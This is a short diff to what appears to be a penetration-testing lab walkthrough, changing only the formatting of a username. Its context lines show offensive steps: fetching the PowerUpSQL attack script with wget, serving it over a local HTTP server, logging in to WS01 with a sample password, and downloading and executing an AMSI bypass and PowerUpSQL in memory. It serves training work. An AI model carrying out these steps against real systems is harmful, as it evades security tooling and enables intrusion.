@@ -63,7 +63,7 @@ wget https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
 python3 -m http.server 8090
 ```
 
-2\. Login to `WS01` as Richard with the password `Sample123`.
+2\. Login to `WS01` as `Richard` with the password `Sample123`.
 
 3\. Start PowerShell and download and execute an amsi and PowerUpSQL in memory:
 
